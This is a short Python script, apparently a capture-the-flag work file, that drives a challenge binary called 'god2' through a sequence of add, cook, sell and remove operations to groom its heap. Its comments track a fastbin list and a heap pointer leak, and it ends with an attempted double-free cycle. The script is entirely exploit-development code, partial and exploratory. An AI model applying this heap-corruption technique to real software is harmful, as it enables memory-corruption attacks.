import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
STEP=sys.argv[1] if len(sys.argv)>1 else 'leak'
g=G('god2')
g.add(b'UNIQ777')
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles')   # #2  (drain)
g.cook(b'Beef noodles')   # #3  (drain)
g.cook(b'UNIQ777')        # #4 = D3 @ YY (D3+0x80=0 clean)
g.add(b'R'*16+b'A')       # R  (clean)
g.add(b'SLOTXX')          # SLOT placeholder
g.sell(b'2')              # free BN #2 -> fb[0x40]=[#2]
g.rm(b'UNIQ777'); g.rm(b'UNIQ777')   # free recipe + D3 -> fb=[D3,#2], D3.fd=&#2
if STEP=='leak':
    g.dump('leak state: fb=[D3,#2], D3.fd=heap'); g.close(); sys.exit()
# cycle: sell intervening BN then D3
g.sell(b'2')              # after removals, pick a live BN
g.sell(b'2')
g.dump('cycle?'); g.close()
